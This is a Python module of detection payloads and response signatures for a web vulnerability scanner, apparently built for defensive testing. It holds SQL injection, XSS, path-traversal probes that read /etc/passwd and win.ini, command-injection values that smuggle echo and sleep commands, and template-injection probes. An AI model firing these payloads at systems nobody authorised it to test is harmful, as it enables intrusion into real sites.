"""Non-destructive detection payloads and signatures for vulnerability tests.

Everything here is designed to *detect* a class of flaw, never to exploit or
damage the target. Time-based probes use short sleeps; injection probes look
for reflected markers or characteristic error strings.
"""
from __future__ import annotations

import re

# --- SQL Injection -----------------------------------------------------------
SQLI_ERROR_PAYLOADS = ["'", "\"", "')", "';", "\"))", "`", "'--", "' OR '1'='1"]

SQL_ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning:\s+mysql",
    r"mysqli?_(?:query|fetch|num_rows)",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\)|pg_exec\(\)|postgresql",
    r"psql:|pg::syntaxerror",
    r"sqlite3?::|sqlite_error|sqlitemanager",
    r"ora-\d{5}",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"sqlstate\[",
    r"syntax error at or near",
    r"supplied argument is not a valid mysql",
    r"column count doesn't match value count",
    r"jdbc\.exceptions",
]
SQL_ERROR_RE = re.compile("|".join(SQL_ERROR_SIGNATURES), re.IGNORECASE)

# Boolean-based: (true-condition, false-condition) appended to a value.
SQLI_BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    ("' OR '1'='1' -- ", "' AND '1'='2' -- "),
]

# Time-based: {n} is the delay in seconds. Kept small (5s) to stay polite.
SQLI_TIME_PAYLOADS = [
    "' AND SLEEP({n}) -- ",
    "\" AND SLEEP({n}) -- ",
    "' AND (SELECT 1 FROM (SELECT SLEEP({n}))a) -- ",
    "'; WAITFOR DELAY '0:0:{n}' -- ",
    ") OR SLEEP({n}) -- ",
    "' || pg_sleep({n}) -- ",
]

# --- XSS ---------------------------------------------------------------------
# Unique marker lets us confirm the exact injected string is reflected raw.
XSS_MARKER = "xSs7q1"
XSS_PAYLOADS = [
    f"<script>{XSS_MARKER}</script>",
    f"\"><svg/onload=alert('{XSS_MARKER}')>",
    f"'><img src=x onerror=alert('{XSS_MARKER}')>",
    f"<b>{XSS_MARKER}</b>",
    f"javascript:alert('{XSS_MARKER}')",
    f"\"'><{XSS_MARKER}>",
]
# Signs a payload was reflected without encoding.
XSS_RAW_REFLECTIONS = [
    f"<script>{XSS_MARKER}</script>",
    f"<svg/onload=alert('{XSS_MARKER}')>",
    f"<img src=x onerror=alert('{XSS_MARKER}')>",
    f"<b>{XSS_MARKER}</b>",
    f"<{XSS_MARKER}>",
]
# DOM-XSS sink/source patterns to grep in inline JS.
DOM_XSS_SOURCES = [
    "location.hash", "location.search", "location.href", "document.URL",
    "document.documentURI", "document.referrer", "window.name",
    "location.pathname",
]
DOM_XSS_SINKS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "eval(", "setTimeout(", "setInterval(", "$(", ".html(", ".append(",
    "insertAdjacentHTML", "Function(",
]

# --- LFI / Path traversal ----------------------------------------------------
LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]
LFI_SIGNATURES = [
    re.compile(r"root:.*:0:0:", re.IGNORECASE),          # /etc/passwd
    re.compile(r"\[extensions\]|\[fonts\]|for 16-bit app support", re.I),  # win.ini
    re.compile(r"daemon:.*:/usr/sbin", re.IGNORECASE),
]

# --- Command injection -------------------------------------------------------
# Marker echoed back proves shell execution without doing anything harmful.
CMDI_MARKER = "c9d1f3a7"
CMDI_PAYLOADS = [
    f"; echo {CMDI_MARKER}",
    f"| echo {CMDI_MARKER}",
    f"& echo {CMDI_MARKER}",
    f"`echo {CMDI_MARKER}`",
    f"$(echo {CMDI_MARKER})",
    f"; echo {CMDI_MARKER} #",
    f"| echo {CMDI_MARKER}",  # windows also honours pipe with echo
]
# Time-based command injection (unix sleep / windows ping).
CMDI_TIME_PAYLOADS = ["; sleep {n}", "| sleep {n}", "& ping -n {n} 127.0.0.1"]

# --- Open redirect -----------------------------------------------------------
OPEN_REDIRECT_TARGET = "https://example.org/websec-redirect-check"
OPEN_REDIRECT_PAYLOADS = [
    OPEN_REDIRECT_TARGET,
    "//example.org/websec-redirect-check",
    "/\\example.org",
    "https:example.org",
]

# --- SSTI --------------------------------------------------------------------
# 7*7 style probes; if the response contains the product, template eval likely.
SSTI_PROBES = [
    ("${{7*7}}", "49"),
    ("{{7*7}}", "49"),
    ("#{7*7}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
]

# --- Parameter names commonly vulnerable to specific classes ----------------
LFI_PARAM_HINTS = {"file", "page", "path", "doc", "document", "include",
                   "template", "view", "load", "read", "download", "filename"}
REDIRECT_PARAM_HINTS = {"url", "next", "redirect", "redir", "return", "returnurl",
                        "return_url", "goto", "dest", "destination", "continue",
                        "target", "link", "out"}
CMDI_PARAM_HINTS = {"cmd", "exec", "command", "ping", "host", "ip", "query",
                    "run", "system", "code"}
